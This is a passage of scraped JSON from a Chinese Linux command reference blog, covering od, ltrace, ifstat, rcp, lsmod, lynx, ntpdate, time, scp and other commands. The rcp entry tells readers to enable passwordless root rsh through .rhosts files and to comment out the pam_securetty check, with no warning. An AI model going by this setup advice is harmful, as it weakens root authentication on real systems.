-N&lt;字符数目&gt;或--read-bytes=&lt;字符数目&gt;：到设置的字符树目为止； -o：此参数的效果和同时指定“-to2”参数相同； -s&lt;字符串字符数&gt;或--strings=&lt;字符串字符数&gt;：只显示符合指定的字符数目的字符串； -t&lt;输出格式&gt;或--format=&lt;输出格式&gt;：设置输出格式； -v 或--output-duplicates：输出时不省略重复的数据； -w&lt;每列字符数&gt;或--width=&lt;每列字符数&gt;：设置每列的最大字符数； -x：此参数的效果和同时指定“-h”参数相同； --help：在线帮助； --version：显示版本信息。 参数 文件：指定要显示的文件。 实例 [linuxde@localhost ~]$ echo abcdef g &gt; tmp [linuxde@localhost ~]$ cat tmp abcdef g 说明：先准备一个 tmp 文件 [linuxde@localhost ~]$ od -b tmp 0000000 141 142 143 144 145 146 040 147 012 0000011 说明：使用单字节八进制解释进行输出，注意左侧的默认地址格式为八字节 [linuxde@localhost ~]$ od -c tmp 0000000 a b c d e f g \\n 0000011 说明：使用 ASCII 码进行输出，注意其中包括转义字符 [linuxde@localhost ~]$ od -t d1 tmp 0000000 97 98 99 100 101 102 32 103 10 0000011 说明：使用单字节十进制进行解释 [linuxde@localhost ~]$ od -A d -c tmp 0000000 a b c d e f g \\n 0000009 说明：设置地址格式为十进制。 [linuxde@localhost ~]$ od -A x -c tmp 000000 a b c d e f g \\n 000009 说明：设置地址格式为十六进制 [linuxde@localhost ~]$ od -j 2 -c tmp 0000002 c d e f g \\n 0000011 说明：跳过开始的两个字节 [linuxde@localhost ~]$ od -N 2 -j 2 -c tmp 0000002 c d 0000004 说明：跳过开始的两个字节，并且仅输出两个字节 [linuxde@localhost ~]$ od -w1 -c tmp 0000000 a 0000001 b 0000002 c 0000003 d 0000004 e 0000005 f 0000006 0000007 g 0000010 \\n 0000011 说明：每行仅输出 1 个字节 [linuxde@localhost ~]$ od -w2 -c tmp 0000000 a b 0000002 c d 0000004 e f 0000006 g 0000010 \\n 0000011 说明：每行输出两个字节 [linuxde@localhost ~]$ od -w3 -b tmp 0000000 141 142 143 0000003 144 145 146 0000006 040 147 012 0000011 说明：每行输出 3 个字节，并使用八进制单字节进行解释 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"od","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/od/","stats":{"text":"4 min read","time":239000,"words":974,"minutes":4},"date":"2022-02-01 14:44:02","dateFormat":"2022-02-01"},{"content":"用来跟踪进程调用库函数的情况。 补充说明 ltrace 命令是用来跟踪进程调用库函数的情况。 语法 ltrace [option ...] [command [arg ...]] 选项 -a 对齐具体某个列的返回值。 -c 计算时间和调用，并在程序退出时打印摘要。 -C 解码低级别名称（内核级）为用户级名称。 -d 打印调试信息。 -e 改变跟踪的事件。 -f 跟踪子进程。 -h 打印帮助信息。 -i 打印指令指针，当库调用时。 -l 只打印某个库中的调用。 -L 不打印库调用。 -n, --indent=NR 对每个调用级别嵌套以 NR 个空格进行缩进输出。 -o, --output=file 把输出定向到文件。 -p PID 附着在值为 PID 的进程号上进行 ltrace。 -r 打印相对时间戳。 -s STRLEN 设置打印的字符串最大长度。 -S 显示系统调用。 -t, -tt, -ttt 打印绝对时间戳。 -T 输出每个调用过程的时间开销。 -u USERNAME 使用某个用户 id 或组 ID 来运行命令。 -V, --version 打印版本信息，然后退出。 -x NAME treat the global NAME like a library subroutine.（求翻译） 实例 最基本应用，不带任何参数： [guest@localhost tmp]$ ltrace ./a.out __libc_start_main(0x80484aa, 1, 0xbfc07744, 0x8048550, 0x8048540 &lt;unfinished ...&gt; printf(&quot;no1:%d &lt;span title=&quot;\\t&quot;&gt;\\t no2:%d &lt;span title=&quot;\\t&quot;&gt;\\t diff:%d&lt;span title=&quot;\\n&quot;&gt;\\n&quot;, 10, 6, 4no1:10 no2:6 diff:4 ) = 24 printf(&quot;no1:%d &lt;span title=&quot;\\t&quot;&gt;\\t no2:%d &lt;span title=&quot;\\t&quot;&gt;\\t diff:%d&lt;span title=&quot;\\n&quot;&gt;\\n&quot;, 9, 7, 2no1:9 no2:7 diff:2 ) = 23 printf(&quot;no1:%d &lt;span title=&quot;\\t&quot;&gt;\\t no2:%d &lt;span title=&quot;\\t&quot;&gt;\\t diff:%d&lt;span title=&quot;\\n&quot;&gt;\\n&quot;, 8, 8, 0no1:8 no2:8 diff:0 ) = 23 --- SIGFPE (Floating point exception) --- +++ killed by SIGFPE +++ 输出调用时间开销： [guest@localhost tmp]$ ltrace -T ./a.out __libc_start_main(0x80484aa, 1, 0xbf81d394, 0x8048550, 0x8048540 &lt;unfinished ...&gt; printf(&quot;no1:%d &lt;span title=&quot;\\t&quot;&gt;\\t no2:%d &lt;span title=&quot;\\t&quot;&gt;\\t diff:%d&lt;span title=&quot;\\n&quot;&gt;\\n&quot;, 10, 6, 4no1:10 no2:6 diff:4 ) = 24 &lt;0.000972&gt; printf(&quot;no1:%d &lt;span title=&quot;\\t&quot;&gt;\\t no2:%d &lt;span title=&quot;\\t&quot;&gt;\\t diff:%d&lt;span title=&quot;\\n&quot;&gt;\\n&quot;, 9, 7, 2no1:9 no2:7 diff:2 ) = 23 &lt;0.000155&gt; printf(&quot;no1:%d &lt;span title=&quot;\\t&quot;&gt;\\t no2:%d &lt;span title=&quot;\\t&quot;&gt;\\t diff:%d&lt;span title=&quot;\\n&quot;&gt;\\n&quot;, 8, 8, 0no1:8 no2:8 diff:0 ) = 23 &lt;0.000153&gt; --- SIGFPE (Floating point exception) --- +++ killed by SIGFPE +++ 显示系统调用： [guest@localhost tmp]$ ltrace -S ./a.out SYS_brk(NULL) = 0x9e20000 SYS_access(0xa4710f, 4, 0xa4afc0, 0, 0xa4b644) = 0 SYS_open(&quot;/etc/ld.so.preload&quot;, 0, 02) = 3 SYS_fstat64(3, 0xbfbd7a94, 0xa4afc0, -1, 3) = 0 SYS_mmap2(0, 17, 3, 2, 3) = 0xb7f2a000 SYS_close(3) = 0 SYS_open(&quot;/lib/libcwait.so&quot;, 0, 00) = 3 SYS_read(3, &quot;&lt;span title=&quot;\\177&quot;&gt;\\177ELF&lt;span title=&quot;\\001&quot;&gt;\\001&lt;span title=&quot;\\001&quot;&gt;\\001&lt;span title=&quot;\\001&quot;&gt;\\001&quot;, 512) = 512 SYS_fstat64(3, 0xbfbd76fc, 0xa4afc0, 4, 0xa4b658) = 0 SYS_mmap2(0, 4096, 3, 34, -1) = 0xb7f29000 SYS_mmap2(0, 5544, 5, 2050, 3) = 0x423000 SYS_mmap2(0x424000, 4096, 3, 2066, 3) = 0x424000 .............省去若干行 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"ltrace","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/ltrace/","stats":{"text":"4 min read","time":234000,"words":755,"minutes":4},"date":"2022-02-01 14:43:39","dateFormat":"2022-02-01"},{"content":"统计网络接口流量状态。 补充说明 ifstat 命令就像 iostat/vmstat 描述其它的系统状况一样，是一个统计网络接口活动状态的工具。ifstat 工具系统中并不默认安装，需要自己下载源码包，重新编译安装，使用过程相对比较简单。 下载 http://gael.roualland.free.fr/ifstat/ （官网） wget http://gael.roualland.free.fr/ifstat/ifstat-1.1.tar.gz 编译安装 tar -zxvf ifstat-1.1.tar.gz cd ifstat-1.1 ./configure make make install # 默认会安装到/usr/local/bin/目录中 注释：执行which ifstat输出/usr/local/bin/ifstat 选项 -l 监测环路网络接口（lo）。缺省情况下，ifstat 监测活动的所有非环路网络接口。经使用发现，加上-l 参数能监测所有的网络接口的信息，而不是只监测 lo 的接口信息，也就是说，加上-l 参数比不加-l 参数会多一个 lo 接口的状态信息。 -a 监测能检测到的所有网络接口的状态信息。使用发现，比加上-l 参数还多一个 plip0 的接口信息，搜索一下发现这是并口（网络设备中有一 个叫 PLIP (Parallel Line Internet Protocol). 它提供了并口...） -z 隐藏流量是无的接口，例如那些接口虽然启动了但是未用的 -i 指定要监测的接口,后面跟网络接口名 -s 等于加-d snmp:[comm@][#]host[/nn]] 参数，通过 SNMP 查询一个远程主机 -h 显示简短的帮助信息 -n 关闭显示周期性出现的头部信息（也就是说，不加-n 参数运行 ifstat 时最顶部会出现网络接口的名称，当一屏显示不下时，会再一次出现接口的名称，提示我们显示的流量信息具体是哪个网络接口的。加上-n 参数把周期性的显示接口名称关闭，只显示一次） -t 在每一行的开头加一个时间 戳（能告诉我们具体的时间） -T 报告所有监测接口的全部带宽（最后一列有个 total，显示所有的接口的 in 流量和所有接口的 out 流量，简单的把所有接口的 in 流量相加,out 流量相 加） -w 用指定的列宽，而不是为了适应接口名称的长度而去自动放大列宽 -W 如果内容比终端窗口的宽度还要宽就自动换行 -S 在同一行保持状态更新（不滚动不换行）注：如果不喜欢屏幕滚动则此项非常方便，与 bmon 的显示方式类似 -b 用 kbits/s 显示带宽而不是 kbytes/s -q 安静模式，警告信息不出现 -v 显示版本信息 -d 指定一个驱动来收集状态信息 实例 默认使用 [root@localhost ifstat-1.1] #ifstat eth0 eth1 KB/s in KB/s out KB/s in KB/s out 0.07 0.20 0.00 0.00 0.07 0.15 0.58 0.00 默认 ifstat 不监控回环接口，显示的流量单位是 KB。 [root@localhost ifstat-1.1]# ifstat -tT time eth0 eth1 eth2 eth3 Total HH:MM:ss KB/s in KB/s out KB/s in KB/s out KB/s in KB/s out KB/s in KB/s out KB/s in KB/s out 16:53:04 0.84 0.62 1256.27 1173.05 0.12 0.18 0.00 0.00 1257.22 1173.86 16:53:05 0.57 0.40 0.57 0.76 0.00 0.00 0.00 0.00 1.14 1.17 16:53:06 1.58 0.71 0.42 0.78 0.00 0.00 0.00 0.00 2.01 1.48 16:53:07 0.57 0.40 1.91 2.61 0.00 0.00 0.00 0.00 2.48 3.01 16:53:08 0.73 0.40 924.02 1248.91 0.00 0.00 0.00 0.00 924.76 1249.31 监控所有网络接口 [root@localhost ifstat-1.1] # ifstat -a lo eth0 eth1 KB/s in KB/s out KB/s in KB/s out KB/s in KB/s out 0.00 0.00 0.28 0.58 0.06 0.06 0.00 0.00 1.41 1.13 0.00 0.00 0.61 0.61 0.26 0.23 0.00 0.00 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"ifstat","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/ifstat/","stats":{"text":"5 min read","time":264000,"words":1009,"minutes":5},"date":"2022-02-01 14:41:44","dateFormat":"2022-02-01"},{"content":"使在两台 Linux 主机之间的文件复制操作更简单。 补充说明 rcp 命令使在两台 Linux 主机之间的文件复制操作更简单。通过适当的配置，在两台 Linux 主机之间复制文件而无需输入密码，就像本地文件复制一样简单。 语法 rcp (选项) (参数) 选项 -p：保留源文件或目录的属性，包括拥有者、所属群组、权限与时间； -r：递归处理，将指定目录下的文件与子目录一并处理； -x：加密两台 Linux 主机间传送的所有信息。 -D：指定远程服务器的端口号。 同名用户的主目录。如果没有给出远程用户名，就使用当前用户名。如果远程机上的路径包含特殊 shell 字符，需要用反斜线\\\\、双引号&quot;&quot;或单引号''括起来，使所有的 shell 元字符都能被远程地解释。需要说明的是，rcp 不提示输入口令，它通过 rsh 命令来执行拷贝。 directory 每个文件或目录参数既可以是远程文件名也可以是本地文件名。远程文件名具有如下形式rname@rhost:path，其中 rname 是远程用户名，rhost 是远程计算机名，path 是这个文件的路径。 参数 源文件：指定要复制的源文件。源文件可以有多个。 实例 rcp 命令使用条件 如果系统中有/etc/hosts文件，系统管理员应确保该文件包含要与之进行通信的远程主机的项。配置过程: 只对 root 用户生效 1、在双方 root 用户根目录下建立 rhosts 文件，并将双方的 hostname 加进去。在此之前应在双方的/etc/hosts文件中加入对方的 ip 和 hostname 2、把 rsh 服务启动起来，redhat 默认是不启动的。 方法：用执行 ntsysv 命令，在 rsh 选项前用空格键选中，确定退出。然后执行service xinetd restart即可。 3、到/etc/pam.d/目录下，把 rsh 文件中的auth required /lib/security/pam_securetty.so一行用“#”注释掉即可。（只有注释掉这一行，才能用 root 用户登录） 将当前目录下的 test1 复制到名为 webserver1 的远程系统： rcp test1 webserver1:/home/root/test3 在这种情况下，test1 被复制到远程子目录 test3 下，名称仍为 test1 。如果仅提供了远程主机名，rcp 将把 test1 复制到远程主目录下，名称仍为 test1 。 还可以在目的目录中包含文件名。例如，将文件复制到名为 webserver1 的系统中： rcp test1 webserver1:/home/root/test3 在这种情况下，将 test1 复制到远程目录 root 下并将其命名为 test3。 从远程系统复制文件：要将远程系统中的文件复制到本地目录下： rcp remote_hostname:remote_file local_fileEnter 将远程系统 webserver1 中的 test2 复制到当前目录： rcp webserver1:/home/root/test2 .Enter .是“当前目录”的简写形式。在这种情况下，远程目录中的 test2 被复制到当前目录下，名称仍为 test2 。 如果希望用新名称复制文件，请提供目标文件名。如果希望将 test2 复制到本地系统中的其他目录下，请使用以下绝对或相对路径名： rcp webserver1:/home/root/test2 otherdir/ Enter 或者，如果希望用其他文件名将文件复制到其他目录下： rcp webserver1:/home/root/test2 otherdir/otherfile Enter 将目录复制到远程系统： 要将本地目录及其文件和子目录复制到远程系统，请同时使用 rcp 和 -r（递归）选项。 rcp -r local_dir remote_hostname:remote_dir Enter 如果当前目录下没有 local_dir，则除本地目录名外，还需要提供相对路径名（自当前目录开始）或绝对路径名（自 / 顶级目录开始）。另外，如果主目录下没有 remote_dir，则 remote_dir 将需要一个相对路径（自主目录开始）或绝对路径（自 / 开始）。 要将名为 work 的子目录完整地复制到 webserver1 远程计算机中的主目录下名为 products 的目录，请键入以下内容： rcp -r work webserver1:/home/root/products Enter 此命令在webserver1:/home/root/products下创建名为 work 的目录及其全部内容（假定/home/root/products已存在于 webserver1 中）。 本示例假定用户处于包含 work 的本地目录下。否则，必须提供该目录的相对或绝对路径，如/home/root/work。 从远程系统复制目录： 要将远程目录及其所有文件和子目录复制到本地目录，请在以下语法中使用 rcp 和 -r（递归）选项。 rcp –r remote_hostname:remote_dir local_dir Enter 要将名为 work 的远程目录复制到当前目录，请键入以下内容： rcp –r webserver1:/home/root/work .Enter .表示当前目录。将在此目录下创建 work 目录。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"rcp","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/rcp/","stats":{"text":"5 min read","time":274000,"words":1230,"minutes":5},"date":"2022-02-01 14:41:28","dateFormat":"2022-02-01"},{"content":"显示目前已 FTP 登入的用户人数。 补充说明 显示目前已 ftp 登入的用户人数。执行这项指令可得知目前用 FTP 登入系统的人数以及 FTP 登入人数的上限。 语法： ftpcount ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"ftpcount","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/ftpcount/","stats":{"text":"1 min read","time":13000,"words":63,"minutes":1},"date":"2022-02-01 14:41:19","dateFormat":"2022-02-01"},{"content":"显示已载入系统的模块。 补充说明 lsmod 命令用于显示已经加载到内核中的模块的状态信息。执行 lsmod 命令后会列出所有已载入系统的模块。Linux 操作系统的核心具有模块化的特性，应此在编译核心时，务须把全部的功能都放入核心。您可以将这些功能编译成一个个单独的模块，待需要时再分别载入。 语法 lsmod 实例 [root@LinServ-1 ~]# lsmod Module Size Used by ipv6 272801 15 xfrm_nalgo 13381 1 ipv6 crypto_api 12609 1 xfrm_nalgo ip_conntrack_ftp 11569 0 xt_limit 6721 2 xt_state 6209 2 ip_conntrack 53665 2 ip_conntrack_ftp,xt_state nfnetlink 10713 1 ip_conntrack xt_tcpudp 7105 6 xt_multiport 7233 1 iptable_filter 7105 1 ip_tables 17029 1 iptable_filter x_tables 17349 5 xt_limit,xt_state,xt_tcpudp,xt_multiport,ip_tables dm_mirror 24393 0 dm_multipath 27213 0 scsi_dh 12481 1 dm_multipath video 21193 0 backlight 10049 1 video sbs 18533 0 power_meter 16461 0 hwmon 7365 1 power_meter i2c_ec 9025 1 sbs dell_wmi 8401 0 wmi 12137 1 dell_wmi button 10705 0 battery 13637 0 asus_acpi 19289 0 ac 9157 0 lp 15849 0 snd_hda_intel 401453 0 snd_seq_dummy 7877 0 snd_seq_oss 32577 0 snd_seq_midi_event 11073 1 snd_seq_oss snd_seq 49585 5 snd_seq_dummy,snd_seq_oss,snd_seq_midi_event snd_seq_device 11725 3 snd_seq_dummy,snd_seq_oss,snd_seq snd_pcm_oss 42817 0 snd_mixer_oss 19009 1 snd_pcm_oss snd_pcm 72517 2 snd_hda_intel,snd_pcm_oss ide_cd 40161 0 snd_timer 24517 2 snd_seq,snd_pcm tpm_tis 16713 0 r8169 43077 0 snd_page_alloc 14281 2 snd_hda_intel,snd_pcm tpm 19041 1 tpm_tis i2c_i801 12737 0 mii 9409 1 r8169 serio_raw 10693 0 i2c_core 24897 2 i2c_ec,i2c_i801 snd_hwdep 12869 1 snd_hda_intel tpm_bios 11073 1 tpm cdrom 36577 1 ide_cd pcspkr 7105 0 parport_pc 29669 1 sg 36973 0 snd 57797 9 snd_hda_intel,snd_seq_oss,snd_seq,snd_seq_device,snd_pcm_oss,snd_mixer_oss,snd_pcm,snd_timer,snd_hwdep parport 37513 2 lp,parport_pc soundcore 11553 1 snd dm_raid45 67273 0 dm_message 6977 1 dm_raid45 dm_region_hash 15681 1 dm_raid45 dm_log 14785 3 dm_mirror,dm_raid45,dm_region_hash dm_mod 63993 4 dm_mirror,dm_multipath,dm_raid45,dm_log dm_mem_cache 9537 1 dm_raid45 ata_piix 23749 4 libata 158085 1 ata_piix sd_mod 25409 6 scsi_mod 144277 4 scsi_dh,sg,libata,sd_mod ext3 126281 3 jbd 57705 1 ext3 uhci_hcd 25421 0 ohci_hcd 24937 0 ehci_hcd 34509 0 第 1 列：表示模块的名称。 第 2 列：表示模块的大小。 第 3 列：表示依赖模块的个数。 第 4 列：表示依赖模块的内容。 通常在使用 lsmod 命令时，都会采用类似lsmod | grep -i ext3这样的命令来查询当前系统是否加载了某些模块。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"lsmod","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/lsmod/","stats":{"text":"3 min read","time":152000,"words":499,"minutes":3},"date":"2022-02-01 14:41:13","dateFormat":"2022-02-01"},{"content":"打印当前内核的主版本号。 补充说明 kernelversion 命令用于打印当前内核的主版本号。 语法 kernelversion ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"kernelversion","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/kernelversion/","stats":{"text":"1 min read","time":7000,"words":34,"minutes":1},"date":"2022-02-01 14:09:15","dateFormat":"2022-02-01"},{"content":"关闭 ppp 连线。 补充说明 这是 Slackware 发行版内附的程序，让用户切断 PPP 的网络连线。 语法 ppp-off ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"ppp-off","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/ppp-off/","stats":{"text":"1 min read","time":7000,"words":35,"minutes":1},"date":"2022-02-01 14:07:53","dateFormat":"2022-02-01"},{"content":"MySQL服务器客户端工具。 补充说明 mysql 命令是 MySQL 数据库服务器的客户端工具，它工作在命令行终端中，完成对远程 MySQL 数据库服务器的操作。 语法 mysql (选项) (参数) 选项 -h：MySQL服务器的ip地址或主机名； -u：连接MySQL服务器的用户名； ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"mysql","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/mysql/","stats":{"text":"1 min read","time":18000,"words":87,"minutes":1},"date":"2022-02-01 14:06:20","dateFormat":"2022-02-01"},{"content":"纯文本模式的网页浏览器。 补充说明 lynx 命令是纯文本模式的网页浏览器，不支持图形、音视频等多媒体信息。 语法 lynx (选项) (参数) 选项 -case：在搜索字符串时，区分大小写； -ftp：关闭 ftp 功能； -nobrowse：关闭目录浏览功能； -noclor：关闭色彩显示模式； -reload：更新代理服务器的缓存，只对首页有效； --color：如果系统支持彩色模式，则激活彩色模式； --help：显示指令的帮助信息； --versiom：显示指令的版本信息。 参数 URL：指定要访问的网站的 URL 地址。 内部命令 移动命令 下方向键：页面上的下一个链接(用高亮度显示)。 上方向键：页面上的前一个链接(用高亮度显示)。 回车和右方向键：跳转到链接指向的地址。 左方向键：回到上一个页面。 滚动命令 +、Page-Down、Space、Ctrl+f：向下翻页。 -、Page-Up、b、Ctrl+b：向上翻页。 Ctrl+a：移动到当前页的最前面。 Ctrl+e：移动到当前页的最后面。 Ctrl+n：向下翻两行。 Ctrl+p：往回翻两行。 )：向下翻半页。 (：往回翻半页。 #：回到当前页的 Toolbar 或 Banner。 文件操作命令 c：建立一个新文件。 d：下载选中的文件。 E：编辑选中的文件。 f：为当前文件显示一个选项菜单。 m：修改选中文件的名字或位置。 r：删除选中的文件。 t：Tag highlighted file。 u：上载一个文件到当前目录。 其他命令 ?、h：帮助。 a：把当前链接加入到一个书签文件里。 c：向页面的拥有者发送意见或建议。 d：下载当前链接。 e：编辑当前文件。 g：跳转到一个用户 指定的URL或文件。 G：编辑当前页的URL，并跳转到这个URL。 i：显示文档索引。 j：执行预先定义的“短”命令。 k：显示键盘命令列表。 l：列出当前页上所有链接的地址。 m：回到首页 。 o：设置选项。 p：把当前页输出到文件，e-mail，打印机或其他地方。 q：退出。 /：在当前页内查找字符串。 s：在外部搜索输入的字符串。 n：搜索下一个。 v：查看一个书签文件。 V：跳转到访问过的地址。 x：不使用缓存。 z：停止当前传输。 [backspace]：跳转到历史页(同 V 命令)。 =：显示当前页的信息。 ：查看当前页的源代码。 !：回到shell提示符下。 _：清除当前任务的所有授权信息。 *：图形链接模式的切换开关。 @：8位传输模式或CJK模式的切换开关。 [：pseudo_inlines 模式的切换开关。 ]：为当前页或当前链接发送一个“head”请求。 Ctrl+r：重新装如当前页并且刷新屏幕。 Ctrl+w：刷新屏幕。 Ctrl+u：删除输入的行。 Ctrl+g：取消输入或者传送。 Ctrl+t：跟踪模式的切换开关。 ;：看Lynx对当前任务的跟踪记录。 Ctrl+k：调用 Cookie Jar 页。 数字键：到后面的第 n 个链接。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"lynx","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/lynx/","stats":{"text":"3 min read","time":174000,"words":789,"minutes":3},"date":"2022-02-01 12:51:00","dateFormat":"2022-02-01"},{"content":"使用网络计时协议（NTP）设置日期和时间。 补充说明 ntpdate 命令是用来设置本地日期和时间。它从指定的每个服务器获得了一些样本，并应用标准 NTP 时钟过滤器和选择算法来选择最好的样本。 此 ntpdate 命令使用以下方法进行时间调整： 如果它确定时钟偏差超过 0.5 秒，它通过调用 settimeofday 子例程设置时钟时间。在引导时间，这是一个首选的方法。 如 果它确定时钟偏差小于 0.5 秒，它通过调用 adjtime 子例程和偏移量来调整时钟时间。此方法倾向于用牺牲一些稳定性来保持漂移时钟更加准确。 当不是通过运行一个守护程序而是从 cron 命令有规则的运行 ntpdate 命令时，每一小时或两小时执行一次可以保证足够的走时精度，从而避免调整时钟。 使用很多服务器可以大幅度改善 ntpdate 命令的可靠性与精度。尽管能使用单一服务器，但您能通过提供至少三个或四个服务器以获得更好的性能。 如果一个类似 xntpd 守护程序的 NTP 服务器守护程序正在同一主机上运行，命令将拒绝 ntpdate 设置日期。 你必须有 root 权限才能在主机上运行这个命令。 语法 ntpdate [ -b] [ -d] [ -s] [ -u] [ -aKeyid] [ -eAuthenticationDelay] [ -kKeyFile] [ -oVersion] [ -pSamples] [ -tTimeOut] Server... 选项 -aKeyid 使用 Keyid 来认证全部数据包。 -b 通过调用 settimeofday 子例程来增加时钟的时间。 -d 指定调试方式。判断 ntpdate 命令会产生什么结果（不产生实际的结果）。结果再现在屏幕上。这个标志使用无特权的端口。 -eAuthenticationDelay 指定延迟认证处理的时间秒数。 -kKeyFile 当不使用缺省值 /etc/ntp.keys 文件时，为包含密钥的文件指定一个不同的名称。 请参阅文件KeyFile的描述。 -oVersion 当轮询它的发出数据包时，指定使用的 NTP 版本实现。 Version 的值可以是 1，2，3。缺省值是 3。 -pSamples 指定从每个服务器获取的样本的数目。 Samples 的值在 1 和 8 之间，并包括 1 和 8。它的缺省值是 4。 -s 指定日志操作 syslog 设施的使用，而不是使用标准输出。 当运行 ntpdate 命令和 cron命令时，它是很有用的。 -tTimeOut 指定等待响应的时间。给定 TimeOut 的值四舍五入为 0.2 秒的倍数。缺省值是 1 秒。 -u 指定使用无特权的端口发送数据包。 当在一个对特权端口的输入流量进行阻拦的防火墙后是很有益的， 并希望在防火墙之外和主机同步。防火墙是一个系统或者计算机，它控制从外网对专用网的访问。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"ntpdate","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/ntpdate/","stats":{"text":"3 min read","time":160000,"words":747,"minutes":3},"date":"2022-02-01 12:50:25","dateFormat":"2022-02-01"},{"content":"统计给定命令所花费的总时间。 补充说明 time 命令用于统计给定命令所花费的总时间。 语法 time (参数) 参数 指令：指定需要运行的额指令及其参数。 实例 当测试一个程序或比较不同算法时，执行时间是非常重要的，一个好的算法应该是用时最短的。所有类 UNIX 系统都包含 time 命令，使用这个命令可以统计时间消耗。例如： [root@localhost ~]# time ls anaconda-ks.cfg install.log install.log.syslog satools text real 0m0.009s user 0m0.002s sys 0m0.007s 输出的信息分别显示了该命令所花费的 real 时间、user 时间和 sys 时间。 real 时间是指挂钟时间，也就是命令开始执行到结束的时间。这个短时间包括其他进程所占用的时间片，和进程被阻塞时所花费的时间。 user 时间是指进程花费在用户模式中的 CPU 时间，这是唯一真正用于执行进程所花费的时间，其他进程和花费阻塞状态中的时间没有计算在内。 sys 时间是指花费在内核模式中的 CPU 时间，代表在内核中执系统调用所花费的时间，这也是真正由进程使用的 CPU 时间。 shell 内建也有一个 time 命令，当运行 time 时候是调用的系统内建命令，应为系统内建的功能有限，所以需要时间其他功能需要使用 time 命令可执行二进制文件/usr/bin/time。 使用-o选项将执行时间写入到文件中： /usr/bin/time -o outfile.txt ls 使用-a选项追加信息： /usr/bin/time -a -o outfile.txt ls 使用-f选项格式化时间输出： /usr/bin/time -f &quot;time: %U&quot; ls -f选项后的参数： 参数 描述 %E real时间，显示格式为[小时:]分钟:秒 %U user时间。 %S sys时间。 %C 进行计时的命令名称和命令行参数。 %D 进程非共享数据区域，以KB为单位。 %x 命令退出状态。 %k 进程接收到的信号数量。 %w 进程被交换出主存的次数。 %Z 系统的页面大小，这是一个系统常量，不用系统中常量值也不同。 %P 进程所获取的CPU时间百分百，这个值等于 user+system 时间除以总共的运行时间。 %K 进程的平均总内存使用量（data+stack+text），单位是 KB。 %w 进程主动进行上下文切换的次数，例如等待I/O操作完成。 %c 进程被迫进行上下文切换的次数（由于时间片到期）。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"time","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/time/","stats":{"text":"3 min read","time":153000,"words":682,"minutes":3},"date":"2022-02-01 12:48:30","dateFormat":"2022-02-01"},{"content":"加密的方式在本地主机和远程主机之间复制文件。 补充说明 scp 命令用于在 Linux 下进行远程拷贝文件的命令，和它类似的命令有 cp，不过 cp 只是在本机进行拷贝不能跨服务器，而且 scp 传输是加密的。可能会稍微影响一下速度。当你服务器硬盘变为只读 read only system 时，用 scp 可以帮你把文件移出来。另外，scp 还非常不占资源，不会提高多少系统负荷，在这一点上，rsync 就远远不及它了。虽然 rsync 比 scp 会快一点，但当小文件众多的情况下，rsync 会导致硬盘 I/O 非常高，而 scp 基本不影响系统正常使用。 语法 scp (选项) (参数) 选项 -1：使用 ssh 协议版本 1； -2：使用 ssh 协议版本 2； -4：使用 ipv4； -6：使用 ipv6； -B：以批处理模式运行； -C：使用压缩； -F：指定 ssh 配置文件； -i：identity_file 从指定文件中读取传输时使用的密钥文件（例如亚马逊云 pem），此参数直接传递给 ssh； -l：指定宽带限制； -o：指定使用的 ssh 选项； -P：指定远程主机的端口号； -p：保留文件的最后修改时间，最后访问时间和权限模式； -q：不显示复制进度； -r：以递归方式复制。 参数 源文件：指定要复制的源文件。 目标文件：目标文件。格式为user@host：filename（文件名为目标文件的名称）。 实例 从远程复制到本地的 scp 命令与上面的命令雷同，只要将从本地复制到远程的命令后面 2 个参数互换顺序就行了。 从远处复制文件到本地目录 scp root@10.10.10.10:/opt/soft/nginx-0.5.38.tar.gz /opt/soft/ 从 10.10.10.10 机器上的/opt/soft/的目录中下载 nginx-0.5.38.tar.gz 文件到本地/opt/soft/目录中。 从亚马逊云复制 OpenVPN 到本地目录 scp -i amazon.pem ubuntu@10.10.10.10:/usr/local/openvpn_as/etc/exe/openvpn-connect-2.1.3.110.dmg openvpn-connect-2.1.3.110.dmg 从 10.10.10.10 机器上下载 openvpn 安装文件到本地当前目录来。 从远处复制到本地 scp -r root@10.10.10.10:/opt/soft/mongodb /opt/soft/ 从 10.10.10.10 机器上的/opt/soft/中下载 mongodb 